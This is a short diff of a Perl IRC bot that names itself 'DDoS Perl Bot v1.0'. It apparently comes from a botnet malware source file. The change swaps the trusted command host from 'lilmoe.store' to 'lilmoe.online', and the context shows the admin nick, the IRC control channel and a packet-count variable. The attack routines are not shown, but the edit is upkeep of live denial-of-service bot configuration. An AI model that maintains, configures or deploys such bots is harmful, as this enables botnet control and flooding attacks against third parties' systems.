@@ -143,7 +143,7 @@ my $homedir = "/tmp";
 my $version = 'DDoS Perl Bot v1.0';
  
 my @admins = ("lilmoe");
-my @hostauth = ("lilmoe.store");
+my @hostauth = ("lilmoe.online");
 my @channels = ("#dew");
  
 my $pacotes = 1;
@@ -935,4 +935,3 @@ sub back { away(); }
 ###################
 ##### [ EOF ] #####
 ###################
-
